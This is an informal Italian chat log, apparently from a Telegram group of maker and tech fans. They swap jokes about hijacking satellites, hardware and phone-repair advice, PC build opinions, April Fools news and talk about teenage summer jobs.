 EEEEEEHHHHH VOGLIAMO PROGRAMMER HUMOR NELLA WHITELIST
Lo vuole anche Giulian
già
lo stavo per dire tipo
ma js, lo dovrebbero fare con il php piuttosto ._.
Finally added
SIIII
Grrrr
ingOHMranza?
se lo aggiungete io qua ci butto tutto ciò che hanno mai publicato, sono perle quelle
js è bello
l'ho aggiunto perchè partivano warn inutili... essendoci programmerjokes 
Pure PHP
Ora mi shitstormano

beh dai, calmi, altrimenti qua partono shitstorm tra linguaggi ogni sera
piuttosto, parliamo dei vegani che ti dicono : "la carne fa solo che male, la verdura e frutta fa bene, 
"
e questo mi è successo oggi tipo, mi sono sentito male
Eh ma i limoni possono caricare gli aifonn!1!!1!!2!1!1137!17
: 
ma perchè giustamente il limone è acido e quindi alcalinizza, datemi fuoco pls, devo depurare la mia anima
semmai il contrario cristo, la gente che guarda su internet la prima cosa che vede la fa diventare religione
Ho comprato una nuova antenna ma non so come collegare massa e segnale
Ecco
Just for the lulz
beh ci sta, facebook fa schifo :D
vuole seriamente fare un lancio spaziale solo per far poi discendere i razzetti facendoli premere nella discesa il tastone delete? C'E' STO QUA SE LE CERCA PROPRIO LE MEME....
Poi mi chiedono perchè io ami Musk
GIULIAN COSA CAZZO HAI COMBINATO
ok intercettare i satelliti, ma far cadere un satellite russo mi sembra troppo 
pff, aspetta che trovo una parabolica bitch
e un microonde....anche lui serve....vedrai
o anche aspetta che riesca a capire come caxxo si usa il PLL del raspi che è fottutamente inutilizzabile in c++ e python.....
il giorno in cui mi connetterò ad un satellite(non è chiedere tanto, mi basta un piccolo trasformatore di dddio e una parabolica) la prima cosa che invierò sarà "1", si perchè di meglio non so fare, e mi aspetto almeno un articolo su dirottamenti dei satelliti della rai
HAHAHAAHAHAHAHAHAAHAHHA
aspetterò con ansia quel momento
Eccola, la mia mano preferita
ops ho eliminato anche il tuo 
Addio e grazie per il pesce
ha spammato di 
, e la mano non si è accorta del 

è stato lui a far cadere la stazione cinese 
poi scopri che se invii "1" ad un satellite lui cade perchè hai beccato qualche codice preimpostato
Oppure vai di bruteforce


Giullian un hacker moderno
che spacca i satelliti a caso
sai che non è neanche stupida come cosa? tanto sui satelliti le sicurezze non sono mai state alte, infondo mica sono i modem che trovi ovunque, probabilmente i sistemi di protezione stanno ai livelli di una wep tipo
Del tipo:

 : CHE CAZZO GLI HAI MANDATO AL SATELLITE????

 : Niente di speciale, il numero 1

 : PORCO —-
un po' come l'inizio di far cry 5 dove arrivi e tutti ti dicono che il tuo arrivo è la causa dell'imminente sterminio dell'umanità
e una bomba dai!
aspetto dei "buoni" notizi Giullian 
ahahahahah
oppure call of duty ghosts,dove sparano la terra dall'alto,forse eri tu a farlo..ammeti!
Sera guys
Pareri su Girada ecc?
Ho rivisto il video di Marco e mi è salita la curiosità
Che è destinato a morire
Pensaci, un sito dove tu paghi 1/4 del prodotto perché i restanti 3/4 lo pagano le altre persone che inviti...
Eh mi son posto la stessa domanda
Eppure siti simili ne escono ancora oggi
ma si ma continuano ad uscirne...se ne esce uno di nuovo valido stile girada io comprerei(se ha appena aperto) perchè almeno un po' è valida come cosa, adesso siamo arrivati tipo ad 1 anno di aspetto credo, e nel frattempo potrebbe benissimo chiudere
Eh sì
Ragazzi
Esiste un materiale che attrae verso di se onde radio?
un buco nero :D
e poi niente, non può esistere qualcosa che ti cattura le onde radio mi dispi se devi solo attrarle beh...c'è la gravità
Più che altro vorrei attirarle verso un' antenna
una parabolica?
È tipo un filo quadrato
Ahaaha
*Giulian's face right now*
È tipo un'antenna quadrata
Non so spiegarvelo
connesso solo un capo o 2?
comunque per convergergli le onde l'unica è una parabolica, nel fuoco ci metti la tua antenna e punti verso da dove arriva il segnale, è l'unica
a ok
Ecco, dato che il dispositivo ha un tag NFC che fa brevi distanze avevo in mente di utilizzare un materiale che attrae verso di se le onde radio
Sempre se esiste
Al massimo faccio in micro buco nero
Plastica
non credo esiste un materiale ma puoi far convergere le onde radio verso un fulcro con un paraboloide
Basta che non sia metallico
Mm
Allora il tag NFC dei telefoni non funzionerebbe, neanche la ricarica wireless
Io avrei un pass
Con un piccolo chip nfc
non sono studiato sul far convergere onde elettromagnetiche verso oggetti io, ho detto "credo", comunque anche una parabola ci sta come sistema
L'nfc se non sbaglio è passivo, quindi serve fisicamente il tag vicino al ricevitore
Qualcuno di voi ha Infinitytv?
Se si, sapete se c'è tutta la terza stagione di mr robot in italiano?
in italiano è impossibile, deve ancora essere doppiato se non sbaglio
ma non ne sono sicuro, prova a guardare
Uhm di chi è colpa ?
Tua
Nope sento l'odore 
Nono
Sei tu
È ufficiale tranqui
Mi hanno chiamato per vendermi un account di fortnite
Non sapendo che a ma fortnite fa altamente schifo

AH MA SEI VIVO
il mio Luco preferito ❤️
si, ma che di solito mi limito a leggere i messaggi
il mio unico filippo
 Anche tu con Apache?
Yess
E con
U buntu
e a capo.
Noooooo apache
raga ho ordinato un mi band 2 dal portale gb italia. Ora dice spedito con ITGLS1. Il pacchetto da dove è partito?
perchè non funziona il sito?
Perché non c'è
ci stai ancora lavorando.
quanti anni hai?
Non mi piace programmare frontend, quindi finirà che lo farà qualcun'altro del team
È scritto in bio, 16
Quanti membri ci sono nel tuo team?
Io, 
 e 
In questo periodo in realtà stiamo lavorando un po' per fatti nostri e non come team perché ognuno sta facendo delle cose diverse.
Francesco sta sviluppando un framework basato sul material design con il quale verrà rifatta da zero tutta la parte client-side di Switchando e io sto continuando a lavorare al backend (ovvero quello che gira sul Raspberry o comunque sul server)
Secondo voi un assemblato che ho mi conviene aggiornarlo con i seguenti componenti??
-VECCHI
+SCHEDA MADRE: GIGABYTE GA-H61M-D2-B3
+CPU: Intel i3-2100 3.10GHz
+GPU: AMD RADEON 5450
+HDD: Wd Blue 500 GB + 1TB
+RAM: 6GB
+ALIMENTATORE: 500W Antec

-NUOVI
+CASE: 


+SSD (os): 

+GPU: eventuale GTX 1050Ti
Io risparmierei sul case e prenderei dei componenti migliori
Tipo?
La gpu
Che alimentatore serve per il rasp?
2 ampere sono sufficienti?
Sì
Cambia tutto bro
2,5 se non vuoi che ti si downclocka
dici?
Dico dico
Prendo da 3 e sono sicuro
Quel 2100 fa abbastanza pena
Decisamente
Si può fare a meno di una gpu potente se la cpu non consente nemmeno di farci girare prato fiorito
la descrizione della mia offerta dice questo ma... teoricamente io vivo in europa
l'Italia sta nell'Europa, nel continente europeo
non sono mai uscito fuori Europa
a mala pena esco da casa
se qualcuno di voi capisce mi può spiegare? Grazie mille
p.s. teoricamente con questa offerta ho 1.5gb di traffico in europa
Sì hai 1.5Gb nel resto d'Europa
Europa intesa come Unione europea no?
Sisi
la cosa che mi lascia perplesso è: che fine hanno fatto quei 100mb 🤔
Mm può essere che non siano davvero 1.5
bho, vabbè
tanto già è molto se esco dal mio piccolo paesino
Quanto hai pagato per attivare la scheda? A me hanno chiesto 25 euro
io 9 euro di attivazione
ma hanno fatto una cosa strana: hanno preso la sim di un altro e hanno fatto la portabilità
infatti mi arrivano messaggi da gente che non conosco
E tu rispondi come se fossi quella persona
ma agli auguri di Pasqua si risponde "Anche a te e famiglia" no?
idem
a patera mi sono scordato la famiglia
  
E buona o meglio una zippy?
Auguri a tutti comunque
Non so rispondenti ma ti consiglio di comprarla da un'alta parte
Dove?
Non lo so ma con 8€ di spedizione non è conveniente
Consegna tra 23 aprile e 11 maggio.....
Hobbyking
Mi sapete consigliare un simulatore Arduino Fatto bene?
anche a pagamento
Auguri a tutti, gente 
Buona Pasqua di Risurrezione a Voi tutti
Buona Pasqua!
Auguri di una buona Pasqua
Ragazzi! Sono felice come una Pasqua!
aspe, ma oggi è pasqua.....



Buona Pasqua Makers
Buongiorno a tutti e buona Pasqua
Auguri, buon natale gente, 
Ti meriteresti €50
Ma non ce li ho
Almeno 100
Miiiii, rapporto parziale o completo?
Chiedi alla segretaria
Sta in portineria
Che schifo
Hanno aggiornato telegram X e hanno fatto la navbar chiara... Osceno
Ma è telegram x questo o quello normale
Telegram X è decisamente buggato
Telegram x
Nah non troppo ormai... E soprattutto è parecchio più veloce
Per qualche ragione divina ha deciso di non scaricare più le immagini/video/etc
Ho provato a disinstallare, reinstallare ma nada
A me solo da wifi
A volte lo fa anche telegram ma qui posso eliminare la cache e riparte
Fortuna che non era buggato

In più non ha il supporto sui temi
Yup
Lo ha lo ha
Molto basico ma lo ha
Buggato non troppo
Ma perché uno dovrebbe preferirlo?
Ne ha 2, scuro e chiaro, stop
Personalmente perché si usa meglio, più veloce, ha delle belle animazioni
Non più
Ma è beta... È il male u.u

Comunque Pasqua 1 aprile, ho paura ad aprire le uova u.u
Si ma i bug lo rendono inusabile
AHAHAHAHHAHAHAHA
Adesso arriva il video di marco con il quarto addio al canale e poi alla fine per un frame c'è scritto 

SSSSSSSSSSSSSSSSSHH
 come avevate implementato il riconoscimento di oggetti sui vostri robot della robocup?
Penso con OpenCV
Bene gienta, oggi che è pasqua, come di tradizione
Ma non era Natale?
E si prepara da majnah
Uh
Il correttore questo
Quando c'era lui non avevamo implementato il riconoscimento oggetti
Buona pasqua a tutti
Rasp? Arduino non ce la può fare
Arduino non credo
Rasperry può far girare Python, quindi tanta roba per il riconoscimento oggetti
Pubg a vita
Assolutamente no
Ma sono gusti
Raga, nell'uovo c'erano 10 euro di film 
Sapete se si può installare Kodi sul now TV box?
Solo le app di now TV posso installare
Eh?
Auguri a tutti, belli e brutti 
buono regalo chili da 10 euro
ma..... scade!!!
io in mezzo anno devo vedermi 10 euro di film?
pezzi di m*rda
   
Raga, per chi crede, Buona Pasqua Makers 
Che giochi stimolano i tuoi sensori più cupi?
I miei che? O.o
Che giochi ti piacciono
Lo stesso, ma anche per i non credenti.... è sempre un Augurio di Pace e Gioia!
Ah ok! Boh dipende...mi sono chiuso tanto giocando a divinity original sin, ultimamente gioco parecchio a r6, Horizon, Saint Raw molto bello, Shadow of Mordor e War... abbastanza giochi si
allora ho la tua stima
È vero 
  un tizio ha creato un profilo uguale al mio e mi ha fatto espellere
Lo so
Sto convincendo gli altri che sei tu quello vero
Ma porca
In più gruppi questi fatto
Quello finto è entrato questa mattina
 questo batte tutti i cable management mancati mai visti
Perché ti vuole così male?
È un coglione
Ah beh allora non è ne il primo ne l'ultimo (purtroppo)
Sono bestemmie
Vuole rompere le palle per lo più
quali?
Sto contattando admin a manetta
simpatico
scrivigli in privato
ahahaha
Avevo contattato pure quelli di terrapiatta e invece di buttare fuori a lui hanno buttato fuori a me
Classic
Ma porca...
Fidati che ci possono essere modi peggiori con i quali essere bannato
Un serpentello in meno qui
Io sto ancora soffrendo
Comunque ricordatevi che io sono 
 637 eh
Lui invece non ha il 7
Ricordate!
le uovaaa
Sbannato
Grazie mille cicca
ma sta ancora nel gruppo questo qui?
Ora vedo, ma non credo
Io sono 637 ricordate
ammettilo stai creando flame da un tuo secondo profilo identico al primo per un po' di notorietà!!
ma noi ti avbiamo scoperto!!11!1











non s'incazzi nessunosto scherzando
orroreeeeeeeeeeeeeeeeeeeeeeeeeee
Ragazzi perché un Bot quando lo metto in esecuzione funziona, ma dopo un po' di tempo quando lo uso nuovamente risponde dopo 5/6 min

Ottimo modo per passare la pasqua, sgrovigliandoli tutti
Si può risolvere questo problema di ritardo?
Tanti auguri makers
LVI?
buona fortuna
Perché sto pensando di fare un riconosce e prendi
 adesso che sei diventato un top Youtubers fatti fare un regalo da DJI, fatti mandare il Tello in regalo  troppo bello quel cosino microscopico
Qualcuno ne sa qualcosa?
Però mi sa che su Arduino Nano non ci sta
Io lo vedi troppo un giocattolo
Beh con gli anni passati a montare e smontare palafitte ormai ho già fatto 
Un drone cinese brandizzato?
l'hanno regalato a cani e porci, secondo me potrebbero mandarglielo ad occhi chiusi 
Io proporrei una collaborazione con two dots 
 ho visto che lo stanno mandando a tutti, sia droni che skate elettrici
That's a good idea
È un problema o tuo di connessione o del server, nel secondo caso non puoi farci niente
DJI è cinese infatti
Tanto cinese che costa
Cinese riferito a cinesata
Tutti sono cinesi
no, il mio bestione è made in Italy
Però ci sono i prodotti cinesi buoni e quelli che fanno veramente schifo
Mh può essere per la troppa distanza dal modem...
Buono solo per i sensori sotto
Mo' 'mmmo segno
Come mettere in comparazione Xiaomi con dodecool
Pinga
Lo mandano sicuro
O come si scrive, insomma, avete capito
poi Marco è un fan dei  China  guarda quanti Alduino ha
L'hanno mandato pure a mr. Nobody
Ahahahahah
Mi pare che avevo visto fosse altino
lo skete che hanno mandato a Lamesta è troppo bello
A me non piacciono, mi sembrano davvero troppo giocattolo
lo skate che hanno mandato a Lamesta è la copia economica di quello di Casey
Che poi questo brand comitato dalla Cina, modifica di vende in Italia con marchio loro
Aggiunge solo Delle chicche
vabbè, gratis si accetta sempre tutto, tranne i calci sui denti
Alduino Ano
Anche tu segui Efrem?
Argh
Ahahahahahahah
Mi fate male ragazzi
Che bravi
Lol
Grazie, perché ho bisogno troppo di uno skateboard elettrico 
La cosa strana comunque è che all'inizio funziona normalmente... poi dopo un po' riscontro questo ritardo di 5 minuti solo al primo messaggio, poi riprende a funzionare normalmente
Sempre sti due punti?
si è bravo e spontaneo..purtroppo anche quei due cancri di Agostini e Climan, per le recensioni e per farmi 2 risate per quanto sono coglioni e venduti..il migliore è Snoogle però, mi fa crepare dalle risate
Si, ma ti avviso che mi sembra troppo giocattolo, comunque ci fai più di 6km
Se vuoi ti consiglio anche una marca buona che lo manda
Bravo e spontaneo?
yep..ha pure il telecomandino ergonomico copia sputata proprio
Anche climan è venduto?
Non ne ho idea
Efrem è bravo per l'attrezzatura che ha, lo preferisco decisamente a Climan e tutti gli altri..anche se preferisco Snoogle onestamente..un altro parecchio bravo che seguo è FedeTutorial
aivoglia
Anche io seguo fede
Mi rendi triste
L'attrezzatura non c'entra nulla...il problema sono i contenuti ahaha e dai ragazzi, non è spontaneo per nulla
Quanto l'ho fatto brutto?
WordPress
Qualcuno di voi ha mai provato LinkedIn? Funziona?
No
cosa sarebbe? un sito?
Più che altro la base su cui allenarmi
In che senso?
ti alleni a creare siti?
Se ha trovato offerte di lavoro
Volevo provare
si, se hai le giuste competenze e titoli e lo sai impostare bene funziona molto bene per i cacciatori di teste
È come infojobs...le offerte le trovi, non è detto ti chiamino. Che poi funziona al contrario in genere, ti chiamano loro, non cerchi tu
Dreamweaver
E i 500€?
Titoli? Competenze? Diploma di terza media, 14 anni, appassionato d'informatica, certificazione corso Google e trinity secondo livello 
fa vlog giornalieri, che ti aspettavi, il tour della Tour Eiffel? abita in culo ai lupi in un paesino di Cuneo, mica a New York
500€?
Che avevi perso?
Delle pile?
Ahhh
Non erano i miei
 i 500€ di pile? Le puoi utilizzare?
Erano di gas
è prestino allora comunque io ti consiglio vivamente un certificato Cambridge e un Cervantes, sono molto richiesti
Stava cercando aiuto
Cambridge tra uno o due anni
Ti confondi sempre...non si parla manco di paesaggi o inquadrature particolari...tipo quando parla di fotografia è un facepalm quasi continuo
Ah ce tu gli hai fatto comprare 500€ di pile?
Trinity? Ma quel coso non vale niente 
è anche questo il bello no? ti fa crepare dal ridere quando fa cretinate
No, mi avrebbe ucciso  le ha prese dalla Cina pensando potesse essere conveniente
Grazie, molto incoraggianti 
il Cisco è molto richiesto per esempio
500€ di pile, dalla cina?
Si 
Da me non si sente
Solo Cambridge
Io ho solo un b2 Cambridge, ma non so, forse più in là prendo un c1
Così, giusto per passatempo 
Ma no, perché è importante ahahahah
Io quest'anno dovevi farmi un mese a Londra 
E non posso più
Perché ho l'esame di karate
 dici che posso aggiungere nel profilo LinkedIn che sono cintura nera? Magari mi chiamano come guardia del corpo o buttafuori 
Okay
Se non sbaglio erano tipo quelle che si usano per la sigaretta elettronica
Si ma
500€ di pile
Ehhh
Ha fatto tutto lui 
Baaaah, che sigaretta deve avere
Non fuma
Dovrebbe
Ma le canne potenti dopo aver speso quei 500€ 
E vi saluto con questa foto di tutta la pianura, visto che poi quassù prende poco poco quindi non scriverò più nulla 
Mi ricordano quasi i colli Euganei ma non sono loro
Come se prima scriveva 
certo che puoi, scrivi anche il Dan e l'associazione dove hai preso l'attestato e dove frequenti
Ma mica mi assumono 
vabbè dico, se vuoi puoi farlo
Una guardia del corpo di 14 anni?
La vedo un po' difficile 
no ovvio ancora sei "piccolo"..devi avere almeno 16 anni
Bastano 16 per quel tipo di lavoro? Non credo
Ma che cosa significa ?
devi copiare il file strings.xml nella directory che ti dice lui e poi riavviare l'app
Vabbè, forse riesci a fingermi 16enne...l'altezza è quella
22 e devi essere massiccio
Perché vuoi farlo?
Che colli sono ?
Bella vista
🤔
K
Per arrotondare
Bah avrai tempo per lavorare quando puoi rilassati
Ma per rilassarmi o bisogno di comprare il materiale per studiare che mi servirà in futuro
Tutto torna no?
Finanziamento dai genitori
Mi prendono a sberle 
A sberle per cosa?
Per quanto chiederei ogni volta 
Ehh
April Fools
Senza neanche aprire
Lol
Stiamo pronti per il pesce di aprile di marco

Stiamo aspettando 
Adesso ci dice che lui è famoso
Del tipo che dice "Me ne vado in Kenya per fare il Missionario"
Lol
Ok ma dove lo trovo il file ?
Oddio lo voglio
N
O
Beh, tre fotocamere, due notch... Il prossimo avrà 2 porte di tipo C
(leggete l'articolo però fino in fondo)
Molto verosimile mi dicono
Sì ma leggi fino alla fine
A me non piace avere un coso nero che mi taglia il display
Ho letto
Eh... È evidentemente un pesce d'aprile dai
"l'importante non è la dimensione ma saperlo usare"
bho

Non hanno una traccia di articolo da seguire... Quindi è ancora più sgrammaticato del solito
Io sinceramente pensavo al notch in basso
La front camera che esce da dietro come alcuni Honor e gli infrarossi sotto schermo
Shit, ti ho reportato per sbaglio
Per la serie "pesci di aprile di Lineage OS"


  
Sapete se si possono mettere CD masterizzati per ps4?

Che intendi?
 
Raga secondo voi com'è questo computer per qualche gioco e per editare video ?
Che dite la piglio?
Se ci metti 16 gb e una 1050ti per me è buono
Secondo me è ottima, fa anche il caffè
Che figo, l'ho visto ora che fa anche le live su YouTube
oh va bene anche con le capsule nespresso, direi che è perfetta
Lo sai vero che se compri tu i pezzi arrivi a manco 400€

non va bene per nulla sto coso
beh...per iniziare un case decente almeno, itek mai e poi mai pls
Madonna
Ho un TX FM e non so l'impedenza
Non so che cavo collegarci
in che zenzo?
se parli dell'antenna mettici brutalmente una parabolica e sei apposto :D
Ora devo saldarci solo il filo dell'antenna
Sul manuale c'era scritta l'impedenza se non sbaglio ma non me la ricordo
Una domanda, posso fare un ripetitore wifi con arduino?
Interessante.....
Io pensavo ad un semplice modulo wifi e uno shield LAN
Però non so se possa mai funzionare, non ho idea di come funzioni realmente un ripetitore
Quell'unica volta nella vita in cui manco ci speri che ti esca giusto e dopo 99 anni di calcoli ti esce effettivamente giusto
Wow
A mia sorella è caduto il computer
Ed adesso c'è questa fascia di pixel tutti accesi permanente
Cestino
Ahahahahahah
L'ho smontato e non c'è nessun segno di danno da caduta
Ahahahahahah
La cosa che mi fa più strano è che i pixel siano accesi 
Cestino
Ahahahahahha
Gli schermi rotti sono rotti... Non si aggiustano mi sa
E almeno che il pc non sia nuovo non vale nemmeno la pena sostituire il pannello
Mi sa che puoi sistemarli
O solo quando sono rossi🤔🤔
Prima Ajax, ora Cicca...
Ow
Ahahah
 a cosa serve sbloccare il bootloader agli smartphone?
Per rootarlo e per cambiare rom
ci sono dei rischi?
ho un mi max 2 e vorrei modificare il build. prop per fare la modifica e vedere i video in 4k sullo smartphone
se proprio hai sfiga in mezz'ora rimetti la rom originale e seia posto
però a sbloccare il bootloader si formatta il telefono
nooooooo
Monitor esterno hdmi
Eh non so
A sto punto mi compro un pezzo di ricambio dello schermo su eBay
Googla
Figo, come mi mancano ste cose1!!!!!
Non so se ne vale la pena.. mi costa 50 euro
Anche la memoria interna eh, tutto proprio
Anche tu ce l'hai ajax?
Più che altro bisognerebbe vedere se sono presenti altri danni oltre allo schermo perchè se compri il pezzo di ricambio per lo schermo e dopo 1 giorno si rompe l'hard disk è uno spreco di soldi
Tanto non lo farò...
chi di voi ha un editor video professionale?
vorrei farmi editare un video
dura 3-4 minuti
mi serve in dolby digital 5.1 però, la traccia e il video lo passo io, và solo unito
Te lo farei volentieri ma con la mia connessione mi passa la voglia
Sinceramente non credo, magari mi sbaglio ma non vedo così potente un Arduino, nemmeno con un esp si può mi sa.... 
Ma c'è lo xiaomi wifi extender a 6€ 
Come faccio a tradurre tutto sto coso? 
In Google translate non ci entra 
Pure se ci entrasse, non dovresti tradurre le cose fuori dalle virgolette.
Puoi farlo in Python leggendo l’xml e utilizzando le api di google translate
io mi chiedo perchè in questo momento mi sto leggendo tutto il sito di 
 .... a già, siamo in vacanza, e mi sento fatto, belooooo
Dove lo trovi un altro linguaggio col pesce d'aprile? 
Da quando Telegram ha le notifiche con l'icona del gruppo o canale?!
‼ È crollato il mercato del mining‼
nVidia annuncia le nuove GPU. GTX bloccate a livello hw e sw per consentire solo giochi.
Avete visto il documentario “Hai preso le pillole?”  di Netflix
Pesce d'aprile? Spero di no
1. Obv è un pesce d'aprile
2. Non puoi bloccare una scheda video per giocare solo, primo è impossibile perchè non ha senso, loro ci rimettono. Poi spiegami come fai a capire se stai giocando o minando, loro ci guadagnano solo a vendere roba a prezzi alti
Sad vittorio che deve aspettare per  la 1080
Raga ho un problema grave
Mi è morto il tasto power del telefono
È acceso, ma non so come riaccenderlo quando muore
Il resto sembra funzionare tutto
Successo anche a mio padre
Perennemente in carica finchè non ripari?
Pls no.
A parte che non posso
Ora deve usare una lametta ficcata nel tasti
Domani devo tornare a Roma e lo stacco
No ma stavo lavando il telefono perché meglio se non ti dico dove l'avevo poggiato
E l'acqua ha ucciso il tasto power
La volta scorsa aveva ucciso la porta USB ma ero riuscito a resuscitarla
Si mi ricordo
E ora non posso accendere il telefono
C'ero pure io online
Perché Android di merda si accende solo col tasto power
E sta volta il di merda se lo merita anche se sono sempre stato fan di Android
Alla fine serve a quello...
Io devo limitarmi a passare il panno sopra
Ma il tasto home come gli iPhone no porcoddue?
Non è waterproof
Manco il mio
Però standoci attento riuscivo a lavarlo
Adesso è ancora "sporco" di sapone
Riesci smontandolo ad individuare il tasto e a sostituirlo?
Non posso smontarlo
Non ho gli attrezzi
Ed è tutto incollato
E poi non potrei montarlo di nuovo
santa pistola termica
e kit di ifixit
Però effettivamente dopo aver cambiato schermo senza metterci la colla avrei dovuto capire che sarebbe stato ancora meno waterproof di prima
Beh 
Comunque top
Piano piano sta tornando in vita
Dal non rispondere proprio è passato al rispondere quando gli va
Ed è un bel passo avanti
Merito dell'asciugacapelli di mia nonna da 2400W (sì diciamo che è più un ustionacapelli)
Asciugacapelli best way to fix a phone
aahahahhahaha
Sempre e comunque
Tranne quando mi si era rotto l'AMOLED
uddio
Na sbatta raga 
pure io ho un amoled
Cioè Gesù Cristo cade 5k volte, alla 5,001k si crepa lo schermo
E alla 5002° volta non si fa manco un graffio e lo poso, 2 minuti dopo lo provo ad accedere e con grande piacere noto che si è fottuto il pannello AMOLED
CHE NERVIIII
MI RICORDI QUANDO MI HANNO SFASCIATO DAL 5 PIANO L AMOLED NUOVO
Ma che
Nuovo nuovo me l hanno fatto cadere
Minimo gliel'avrei fatto ripagare
Due anni fa un tipo ha giocato col mio vecchio telefono a farci i pallonetti come fosse un pallone da calcio
Infatti mi sono fatto cambiaree il pannello
E non è morto, si è solo mezza rotta la scheda di rete, che se non gli davi qualche botta anche se aveva il segnale non andava internet...
E per qualche motivo non mi sono fatto dare manco 1€
Ma io me lo sarei fatto ricomprare da zero
Magari
A come sono quella massa di  non lo avrebbero mai fatto
Guarda che avrebbero avuto alternative eh
A  me è caduto il telefono dentro l'acqua della mozzarella, ora non funziona più la fotocamera posteriore 
Ah
Almeno era mozzarella buona?
Si si, portata dai nonni napoletani 
se il cellulare prende più segnale erano radioattive le mozzarelle

Saaaaad story
io alla tua età in estate facevo le notti in panificio, dai 14 ai 16 anni..poi dai 16 ai 18 facevo la mattina cantiere come aiuto elettricista, e il pomeriggio il bagnino al lido comunale (con brevetto)..sono esperienze che formano, lascia stare tutte le buttanate del lavoro minorile ecc.
assolutamente si
penso siano adattabili anche gli obiettivi che hai già, sia i Nikon sia i Canon
basta prendere qualche adattatore
Non farmi sentire una cacxa ahha
ti dico solo che il mio primo impianto citofonico e automatismo di cancello l'ho montato e progettato a 17 anni (era un Came, ancora me lo ricordo)
Pronti a vedere una cinesata dal cielo?
mio padre appena finita la scuola (andavo all'ITIS) mi diceva: bene, sei in vacanza, debiti da recuperare non ne hai..vuoi il motorino e qualche soldo in tasca? cercano qualcuno al panificio, in ditta e dal barbiere..scegli pure dove vuoi andare, questo è quanto pagano, tu scegli e io vengo con te a parlare con il proprietario..altri tempi
P.s camera mia si trova molto distante dal salotto e il router sta in salotto
Io avevo provato a farmi assumere la scorsa estate ma non ti cagano di striscio se non hai almeno 16 anni
Finito gli esami, il giorno dopo "Meh, non pensare che sia finita...vai a lavorare"
mi manca il mio 4g con cui andavo a 50mb al secondo
anche se avevo solo 2 gb
perchè ora fanno più controlli l'Ispettorato del lavoro e l'Asl, devono assumerti come stagionale..ai miei tempi si lavorava in nero in estate (io sono vecchietto, ho 30 anni )
E io ne ho 23 e non ho mai fatto un tubo
esperienze che formano il carattere, è verissimo
Io ne ho la metà esatta xD
Si ma capisci, appena finito gli esami...almeno una vacanza me la fai farr
io a mare andavo il pomeriggio alle 5-6, appena smontavo..tovaglia nel bauletto e via
c'è sempre tempo io faccio 3 lavori pensa un pò.. Vigile del fuoco, elettricista-sistemista e barbiere
Io non mi taglio i capelli da novembre
 se capiti a Reggio te li taglio gratis
Non potrai mai avere gli stessi risultati di uno normale
Ti consiglio di comprarlo
Ahaha
Ti dai da fare però
Pure io
Infatti sono indecente, devo rimediare
anche la barbazza ti devo sistemare se mi capiti a tiro
e sto anche facendo l'abilitazione di barbiere professionista
Ahaah ma è perfetta
Io li ho lunghi 12cm fai te...
Erano altri tempi, adesso non ti prende nessuno
Io aiuto mio zio d'estate
si ai passeri piacerebbe tanto per farci il nido
ottimo
Aiuto con molte virgolette 
vabbè si inizia sempre così. e normale
Almeno ho imparato a usare inventor e a stampare in 3d :D
(in teoria dovevamo creare una stampante 3d reciclando una prusa, ma ancora abbiamo fatto solo il disegno)
che lavoro fa? il grafico?
Ma nooo
La ho sistemata proprio oggi
Più che altro fa prototipi
Non so come spiegarlo 
🤔vediamo? fai parlare un professionista
Prototipazione 
Ma non fa solo prototipazione
Eh ma adesso sono nel letto
Dai, lo slogan è "We make it real"
sei più pigro di Marco
allora mi sa che imparerai parecchio
Si 
Non posso farmi una foto così Ahahah
nessuno ti giudicherebbe per il fatto di essere in pigiama lo siamo tutti al momento
Non capisco come funzionano i pagamenti su scaleway...
Cosa non capisci?

Se i soldi se li incula da solo o glieli devo dare io
Ogni ora che usi una VPS paghi x centesimi, a fine mese ti fa la transazione totale
Devi mettere la carta di credito e fa tutto lui
L'ho messa quando mi sono registrato
Si, il mese è già finito
 ADORO quest'uomo!!!!
Se vai nella sezione del tuo account dovresti trovarla
E ti ha scalato i soldi?
No
Su state mi da "Stopped"
Hai controllato di avere fondi sulla carta?
Si
Allora prova ad aprire un ticket, rispondono subito
Scrivi in inglese ovviamente
Anche tu usi scaleway? 🤔
Si, è molto più comodo di ovh
Anche se purtroppo ci sono pochi server
Non so che è ovh 
Una ditta che fornisce VPS/Dedicati/domini
Ah ok
 Guardate chi c'è al minuto 3:46 

Mi arriva una mail se rispondono?
Hahaha mamma sono in tivvu
Io sono praticamente senza social da due giorni, domani sera riprendo e vedo i video arretrati
Immagino di sì
 
Colpa di 
hai finito di cucinare la carne arrosto?
fa bene, almeno esci un pò dalla tua stanza
Avevamo tre primi e quattro carni oggi
Ahahhahha
 prossimo IMDO: come dimagrire dopo essere stati ostaggi della nonna
Ristorante, ristorante
hai offerto tu con i mega dollari di Youtube?
Annaffiati giù da un buon mezzo litro abbondante di rosso dei colli
Mammamia indimenticabile ahhaha
Si nota dalle foto
🤔instagram?
Si proprio, non ho comprato il locale solo per rispetto
Sì ahahaah
Stories di giorgio
ora guardo
No in realtà non si nota niente perché era bello leggero
Devo uscire gli screen o posso evitare?
Ma vabbè dai con la luce del ristorante e la fotocamera del telefono...
See
Sono solo indeciso se hai lo sguardo più fumato o brillo
si assai leggero
ORA vi posto una perla assurda 
RULLO DI TAMBURI!!!!!
 
UGUALE AD ORA
identico
Quella polo poi è stupenda
succede anche questo quando ti veste la mamma..polo verde acido e cappellino arancione evidenziatore..perchè altrimenti "ti bruci al sole"
Probabilmente quel 'ti veste la mamma' è letterale proprio
Conoscendo marco
ma povero, ma non è vero dai
NON HAI MESSO LAICCCCC
certo che si..screen fatto prima
anche nella foto di Freddie 
Ahhaha
Ahahahaahaha ❤
Bravo❤️
 e un mini 
 :D
Mini proprio mini
troppo pucciosi..guardate che sguardo fiero da Youtuber che aveva già a quell'età
 per farti capire il mio livello di fan
Puccioserrimi
Anche se credo che quello sguardo sia più da "evviva, mi è nato il cuginetto... Finalmente qualcuno da bullizzare per bene"
Raga fra atom x5 e atom Z8350 qual è il migliore?
Grazie Ivan
Io ne ho 8
Hahahahahbhabha
AHAHAAHAHAH ti ho pensato appena l'ho visto nella Home
Uno xiaomi con una ottima fotocamera a poco ne abbiamo?
Redmi note 4
Mmmpf
Il note 3
O il redmi note 5
Assolutamente no
Come no
È una delle best cameras
Con 90 punti su dxomark
Mh
Non il redmi note 3 eh! Lo xiaomi mi note 3
Redmi note 5A?
Nono
Xiaomi redmi note 5
Ahahah
certo..la mirrorless Xiaomi
Si? Ho letto pessime recensioni
lo so, le ho lette anch'io..ma se vuole provarla c'è sempre il reso Amazon con rimborso
Scontino è morto 
?
nope... dagli un 
fatto..solo che mi pubblica solamente sul mio e non sul canale di Marco in contemporanea
